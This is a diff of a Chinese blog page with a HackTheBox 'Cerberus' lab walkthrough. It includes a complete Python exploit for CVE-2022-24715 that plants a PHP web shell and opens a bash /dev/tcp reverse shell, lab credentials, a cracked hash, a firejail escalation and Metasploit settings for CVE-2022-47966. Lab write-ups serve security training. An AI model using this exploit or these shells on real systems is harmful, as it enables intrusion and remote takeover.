@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;534 10.10.11.205   端口扫描就一个8080: 12345678910111213$ nmap -sC -sV -Pn 10.10.11.205Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-03-22 09:49 CSTNmap scan report">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;534 10.10.11.205                                                                                                              端口扫描就一个8080: 12345678910111213$ n">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Cerberus - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/03/22/Cerberus-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;534 10.10.11.205   端口扫描就一个8080: 12345678910111213$ nmap -sC -sV -Pn 10.10.11.205Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-03-22 09:49 CSTNmap scan report">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;534 10.10.11.205                                                                                                              端口扫描就一个8080: 12345678910111213$ n">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032201.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032202.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032203.jpg">
@@ -133,7 +133,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -222,7 +222,14 @@
 <li><a href="https://app.hackthebox.com/machines/534" target="_blank" rel="noopener">https://app.hackthebox.com/machines/534</a></li>
 <li>10.10.11.205</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032201.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032201.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>就一个8080:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.205</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 09:49 CST</span><br><span class="line">Nmap scan report for 10.10.11.205</span><br><span class="line">Host is up (0.091s latency).</span><br><span class="line">Not shown: 999 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 63.52 seconds</span><br></pre></td></tr></table></figure>
 
@@ -231,23 +238,58 @@
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>需要加hosts,icingaweb2：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.205  icinga.cerberus.local</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032202.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032202.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="icingaweb2"><a href="#icingaweb2" class="headerlink" title="icingaweb2"></a>icingaweb2</h1><p>可以搜到相关漏洞：</p>
 <ul>
 <li>Path Traversal Vulnerabilities in Icinga Web | Sonar<br><a href="https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/" target="_blank" rel="noopener">https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/</a></li>
 </ul>
 <h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>首先是LFI读文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032203.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032203.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据文档读一些配置文件，得到账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">matthew</span><br><span class="line">IcingaWebPassword2023</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>Advanced Topics - Icinga Web<br><a href="https://icinga.com/docs/icinga-web/latest/doc/20-Advanced-Topics/#advanced-topics-authentication-tips-manual-user-database-auth" target="_blank" rel="noopener">https://icinga.com/docs/icinga-web/latest/doc/20-Advanced-Topics/#advanced-topics-authentication-tips-manual-user-database-auth</a></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032204.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032205.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032204.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032205.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>得到的账号密码可以登录web：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032206.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032206.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="CVE-2022-24715"><a href="#CVE-2022-24715" class="headerlink" title="CVE-2022-24715"></a>CVE-2022-24715</h2><p>然后就是登录后利用CVE-2022-24715，就是根据sonar博客里的步骤：</p>
 <ol>
 <li>创建一个ssh密钥对：</li>
@@ -272,7 +314,14 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 icingaweb2.py -i 10.10.14.2 -p 4444</span><br></pre></td></tr></table></figure>
 
 <p> 得到的是容器的www-data:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032207.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032207.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csrf</span><span class="params">(resp)</span>:</span></span><br><span class="line">    soup = bs4.BeautifulSoup(resp.text, <span class="string">"lxml"</span>)</span><br><span class="line">    csrf_token = soup.find(<span class="string">"input"</span>, &#123;<span class="string">"id"</span>: <span class="string">"CSRFToken"</span>&#125;)[<span class="string">"value"</span>]</span><br><span class="line">    <span class="keyword">return</span> csrf_token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'lol'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-i'</span>, <span class="string">'--ip'</span>, help=<span class="string">'nc listener ip'</span>, required=<span class="keyword">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'nc listener port'</span>, required=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    session = requests.session()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LOGIN</span></span><br><span class="line">    URL = <span class="string">"http://icinga.cerberus.local:8080/icingaweb2/authentication/login"</span></span><br><span class="line">    resp = session.get(URL)</span><br><span class="line">    csrf_token = get_csrf(resp)</span><br><span class="line">    data = &#123;<span class="string">"username"</span>:<span class="string">"matthew"</span>,<span class="string">"password"</span>:<span class="string">"IcingaWebPassword2023"</span>,<span class="string">"rememberme"</span>:<span class="string">"0"</span>,<span class="string">"redirect"</span>:<span class="string">""</span>,<span class="string">"formUID"</span>:<span class="string">"form_login"</span>,<span class="string">"CSRFToken"</span>:csrf_token,<span class="string">"btn_submit"</span>:<span class="string">"Login"</span>&#125;</span><br><span class="line">    resp = session.post(URL, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># CHANGE MODULE PATH</span></span><br><span class="line">    URL = <span class="string">"http://icinga.cerberus.local:8080/icingaweb2/config/general"</span></span><br><span class="line">    resp = session.get(URL)</span><br><span class="line">    csrf_token = get_csrf(resp)</span><br><span class="line">    data = &#123;<span class="string">"global_show_stacktraces"</span>:<span class="string">"0"</span>,<span class="string">"global_show_stacktraces"</span>:<span class="string">"1"</span>,<span class="string">"global_show_application_state_messages"</span>:<span class="string">"0"</span>,<span class="string">"global_show_application_state_messages"</span>:<span class="string">"1"</span>,<span class="string">"global_module_path"</span>:<span class="string">"/dev/"</span>,<span class="string">"global_config_resource"</span>:<span class="string">"icingaweb2"</span>,<span class="string">"logging_log"</span>:<span class="string">"syslog"</span>,<span class="string">"logging_level"</span>:<span class="string">"ERROR"</span>,<span class="string">"logging_application"</span>:<span class="string">"icingaweb2"</span>,<span class="string">"logging_facility"</span>:<span class="string">"user"</span>,<span class="string">"themes_default"</span>:<span class="string">"Icinga"</span>,<span class="string">"themes_disabled"</span>:<span class="string">"0"</span>,<span class="string">"authentication_default_domain"</span>:<span class="string">""</span>,<span class="string">"formUID"</span>:<span class="string">"form_config_general"</span>,<span class="string">"CSRFToken"</span>:csrf_token,<span class="string">"btn_submit"</span>:<span class="string">"Save Changes"</span>&#125;</span><br><span class="line">    resp = session.post(URL, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ENABLE MODULE</span></span><br><span class="line">    URL = <span class="string">"http://icinga.cerberus.local:8080/icingaweb2/config/moduleenable"</span></span><br><span class="line">    resp = session.get(URL)</span><br><span class="line">    csrf_token = get_csrf(resp)</span><br><span class="line">    data = &#123;<span class="string">"identifier"</span>:<span class="string">"shm"</span>,<span class="string">"CSRFToken"</span>:csrf_token,<span class="string">"btn_submit"</span>:<span class="string">"btn_submit"</span>&#125;</span><br><span class="line">    resp = session.post(URL, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># UPLOAD SSH KEY</span></span><br><span class="line">    URL = <span class="string">"http://icinga.cerberus.local:8080/icingaweb2/config/createresource"</span></span><br><span class="line">    resp = session.get(URL)</span><br><span class="line">    csrf_token = get_csrf(resp)</span><br><span class="line">    data = &#123;<span class="string">"type"</span>:<span class="string">"ssh"</span>,<span class="string">"name"</span>:<span class="string">"test"</span>,<span class="string">"user"</span>:<span class="string">"test"</span>,<span class="string">"private_key"</span>:<span class="string">"-----BEGIN RSA PRIVATE KEY-----\r\n\</span></span><br><span class="line"><span class="string">MIIG4gIBAAKCAYEAnwzoFa6BxCXcWsbMWc2G50BK29CEcnkxN3PkFZsQmZJNZexc\r\n\</span></span><br><span class="line"><span class="string">5+SlFBXMLcxAhlvOkrUyHg5Jc7pMiPL57TgbmQXxKWmz4/fk/eXaS3II1fxuWDmx\r\n\</span></span><br><span class="line"><span class="string">X3bdBUfFbCWs+Hlk3fFJgO+CHiJuafNucKWSEIrJgYiOCWM3rWHc83pCf2MGkaki\r\n\</span></span><br><span class="line"><span class="string">p1I5CTy5bIivpBQgdOhGBRRbw7J5CX0uBe6j/gTVMihnsuZAU11nkFrvaDYTLdCg\r\n\</span></span><br><span class="line"><span class="string">ksn7Dov1mZRN8IELJCHyOQwJUSTaR8vlbkksGQWKL4HZiJ71zvqw3CJQIbMGfhAW\r\n\</span></span><br><span class="line"><span class="string">mWB35Vg19aA1Q7PO1Dnzm8IOO3h51w6sdysBUFkvE3B/APED1ZjP7y717NBXGJI9\r\n\</span></span><br><span class="line"><span class="string">ZbWPJW6hXbwx8++h12QfxFleXJltCWXbTc6vkrUoQ2Gqe0+G/2fBXLviLmGRNhOX\r\n\</span></span><br><span class="line"><span class="string">Af9VWQJ9JmdU/epe6W7EujE4krfk7MwnNXLfJIB1y0BOqtd8mVAyGwOoCsvk/aJ+\r\n\</span></span><br><span class="line"><span class="string">j1yQZBvN45M+W1RpAgMBAAECggGAIxtMdBK1gnfv7FqSmyTeSNd8XoonXgQprKmI\r\n\</span></span><br><span class="line"><span class="string">OAum7ZrpOhziwe3KUUVhcN9zg6Sqk1/q7M7vABwoThdBus6Gau+wlFlIU4KxeSh9\r\n\</span></span><br><span class="line"><span class="string">12bXk/IY4iDz6ZQ5Q3Pc3Brx09Opw8KBXLQhJqkncXwBzdwCAmQ8B7s+TMyparwd\r\n\</span></span><br><span class="line"><span class="string">8uEy4d7YAZlRdJjVzZfpfs8p47/sjRmC8RaWDbtsc399w+HxsT1cWKqp/wdLPgtx\r\n\</span></span><br><span class="line"><span class="string">M2AbFYfQEm4JL3VlVMfoYWqmjHZTB7+nHDFu2oY/0Jau+wgFUbxNVNGuBUz1xhkv\r\n\</span></span><br><span class="line"><span class="string">9dPItJuzn0IeHxdEmnMyA8MggFzM8kTql7Mbcwhm8NdXuasnADNvT8rYQnXkN3N+\r\n\</span></span><br><span class="line"><span class="string">cgSNSX2EPFZlkiYNMnw01MSNmvndEBjkeB3UIGT4nA91FA21kUQtQXsczDvfITUw\r\n\</span></span><br><span class="line"><span class="string">FZi6azdyRKyEpIQeFDdWVAO//IfCOrAMdT8A2ZZ0xBm2B6ipUG3OkV1OK9c+GhPB\r\n\</span></span><br><span class="line"><span class="string">FcnXTIywMqcvYXPS3nd+ZfhPonKNAoHBAL56caVU0/2oQ30l9hjCM2EwZuUgt4G+\r\n\</span></span><br><span class="line"><span class="string">QKwPtUhvqVipyDJ9othh5ouNylqzGm5togqVmRTZGiZkc9qFzGuPlYE2lXdYZ8vA\r\n\</span></span><br><span class="line"><span class="string">bDk6aroDjkwhSzgIRRc9aqDyMgwf2kpNAjfb4Gj7K1W7HZesLZD03p6A5OXf3K8l\r\n\</span></span><br><span class="line"><span class="string">BdLj9iQl5DbP3yucAqn7Kao3nwwcxbJGeXhPjV9QZb1SdfGGbnVwMyUe5BqCi3Dn\r\n\</span></span><br><span class="line"><span class="string">qNQq7IZXm33EWRr8P51yAVsyjTOx47ANlQKBwQDVwurYfD7ethyI8HksCWIZWqEe\r\n\</span></span><br><span class="line"><span class="string">SYcqWOZQtIBlmy9K9cgMlZUNLWrFm9Dj4AJBsZcR7X9mqHsRZTw6UZIqSXfGXhDq\r\n\</span></span><br><span class="line"><span class="string">D02du2UzCFmdsBvn722sVJ19QOZcVVYtIEMpAV42IBqisdyk2htzMWaRsjQuaNuw\r\n\</span></span><br><span class="line"><span class="string">bbVenCOnH2gxTXBJO/Qy6tWR4Fmr2zJaDVQE1/OlB/W3U/DQqCh67y5hNFEYcTxD\r\n\</span></span><br><span class="line"><span class="string">mhJURp+AN+rH/7/vDH9IkqDQz3jlKmpTALvFroUCgcAfoW+r19lYPw/uAVbLp7wm\r\n\</span></span><br><span class="line"><span class="string">gIYluHgguHo+2GDvRXOmwJL5J3naWu+Q7xvSUfmqqtQE0/DW0HKSO44tlJhsqCxY\r\n\</span></span><br><span class="line"><span class="string">h7rsVabu4+ZU3omImDySEdlO1bi7cjx5u55p+wQh4IXkxsOOS19X3jm8zR/H+ZHa\r\n\</span></span><br><span class="line"><span class="string">WmcocTNRdmFwMuDWAeDS5VQXBtI+bfHuTUxBE6oUv7U+MF+2m0A53y6sy/kd0WL8\r\n\</span></span><br><span class="line"><span class="string">4BNa/6CuQBn+GZ6rdHLiwK9XVtotiBgHj+54ziqUOr0CgcAy0ts/iZrxHN9/95z3\r\n\</span></span><br><span class="line"><span class="string">yWtXl+LC7ryCZwyrl58HiXQfIHzl8RK1RV0jir6Jz5L5x52hl5Q49kn8gtNlEkvs\r\n\</span></span><br><span class="line"><span class="string">XfdqZKck32qW3B1dmtij02FvLdAnrx6azzl2LpwEsq0FLNwXhl6O3DcXwvvP0akP\r\n\</span></span><br><span class="line"><span class="string">bw1VE31YX11GF12quJ7vSfgukWCoUolg27S2VbGNE6osVKQLUu8rHXweQD0PrZqb\r\n\</span></span><br><span class="line"><span class="string">ZfL6GsI3WISPIRN/Ssw5rScXUSNaP/KYcxvNcN5CyePbRnkCgcAxRL9R248NuHWd\r\n\</span></span><br><span class="line"><span class="string">JWrhA9M3Mbu0Ci0yAmW0tEZAW63qMZeaoaGscShe+8W+RvjEt3WMIL2cfUMrTL0S\r\n\</span></span><br><span class="line"><span class="string">r48hlbcQYWCWQwZvXdx8mPsqRjTJ6HGgcsL+lTOwt5JyRGm6/uceFb6QbDN786qy\r\n\</span></span><br><span class="line"><span class="string">MZRQGUrt1/RKrZ2o/m5yUN0+VcYkEPakbwT6uT7RVYdqajqv0tOAe4gesdXiTLlA\r\n\</span></span><br><span class="line"><span class="string">hfyBckWeSXUpvbPZJjjIa3CB0H1zkKpdY9bnhGGnHuWfeYwenh0=\r\n\</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----"</span>,<span class="string">"formUID"</span>:<span class="string">"form_config_resource"</span>,<span class="string">"CSRFToken"</span>:csrf_token,<span class="string">"btn_submit"</span>:<span class="string">"Save Changes"</span>&#125;</span><br><span class="line">    resp = session.post(URL, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># EXPLOIT: WRITE PHP FILE</span></span><br><span class="line">    URL = <span class="string">"http://icinga.cerberus.local:8080/icingaweb2/config/createresource"</span></span><br><span class="line">    resp = session.get(URL)</span><br><span class="line">    csrf_token = get_csrf(resp)</span><br><span class="line">    data = &#123;<span class="string">"type"</span>:<span class="string">"ssh"</span>,<span class="string">"name"</span>:<span class="string">"asdf2"</span>,<span class="string">"user"</span>:<span class="string">"../../../../../dev/shm/run.php"</span>,<span class="string">"private_key"</span>:<span class="string">"file:///etc/icingaweb2/ssh/test\x00&lt;?php system($_REQUEST['cmd']);?&gt;"</span>,<span class="string">"formUID"</span>:<span class="string">"form_config_resource"</span>,<span class="string">"CSRFToken"</span>:csrf_token,<span class="string">"btn_submit"</span>:<span class="string">"Save Changes"</span>&#125;</span><br><span class="line">    resp = session.post(URL, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET REVERSE SHELL</span></span><br><span class="line">    URL = <span class="string">"http://icinga.cerberus.local:8080/icingaweb2/shm/run"</span></span><br><span class="line">    data = &#123;<span class="string">"cmd"</span>:<span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/&#123;&#125;/&#123;&#125; 0&gt;&amp;1'"</span>.format(args.ip,args.port)&#125;</span><br><span class="line">    session.post(URL, data=data)</span><br></pre></td></tr></table></figure>
 
 <h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p>简单枚举发现firejail有suid：</p>
@@ -289,10 +338,31 @@
 <p>需要两个shell，一个运行firejoin.py，另一个join：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.14.2:7777/firejoin.py</span><br><span class="line"></span><br><span class="line">python3 firejoin.py</span><br><span class="line"></span><br><span class="line">firejail --join=1792</span><br><span class="line"><span class="meta">#</span><span class="bash"> 给出的sudo不行，但可以直接su了</span></span><br><span class="line">su -</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032208.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032209.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032208.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032209.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>检查相关配置文件以及查看相关数据文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032210.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032210.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@icinga:&#x2F;var&#x2F;lib&#x2F;sss&#x2F;db# strings cache_cerberus.local.ldb</span><br><span class="line"></span><br><span class="line">name&#x3D;matthew@cerberus.local,cn&#x3D;users,cn&#x3D;cerberus.local,cn&#x3D;sysdb</span><br><span class="line"></span><br><span class="line">cachedPassword</span><br><span class="line">$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX&#x2F;Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0</span><br></pre></td></tr></table></figure>
 
 <p>得到的hash破解出来密码：</p>
@@ -304,9 +374,23 @@
 <p>然后连接，桌面得到user flag：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm  -u 'matthew' -p '147258369' -i 127.0.0.1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032211.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032211.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>常规枚举发现ManageEngine ADSelfService Plus</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032212.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032212.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="CVE-2022-47966"><a href="#CVE-2022-47966" class="headerlink" title="CVE-2022-47966"></a>CVE-2022-47966</h2><p>搜索得到相关的比较新的漏洞：</p>
 <ul>
 <li>ManageEngine Security Advisories<br><a href="https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html" target="_blank" rel="noopener">https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html</a></li>
@@ -324,15 +408,36 @@
 <p>用我们的matthew账号登录无权限，但已经能够得到所需的GUID了：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">67a8d101690402dc6a6744b8fc8a7ca1acf88b2f</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032213.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023032213.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>检查burp流量也能发现一个对一个xml的请求，其中可以得到需要的issuer信息：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;dc.cerberus.local&#x2F;FederationMetadata&#x2F;2007-06&#x2F;FederationMetadata.xml</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;dc.cerberus.local&#x2F;adfs&#x2F;services&#x2F;trust</span><br></pre></td></tr></table></figure>
 
 <h1 id="exploit-amp-root-flag"><a href="#exploit-amp-root-flag" class="headerlink" title="exploit &amp; root flag"></a>exploit &amp; root flag</h1><p> metasploit有对应模块，直接用方便点：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966</span><br><span class="line">set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f</span><br><span class="line">set ISSUER_URL http://dc.cerberus.local/adfs/services/trust</span><br><span class="line">set RHOSTS 172.16.22.1</span><br><span class="line">set LHOST 10.10.14.2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 坑，还是要手动指定一下</span></span><br><span class="line">set Proxies socks5:127.0.0.1:1080</span><br><span class="line">set ReverseAllowProxy true</span><br><span class="line"></span><br><span 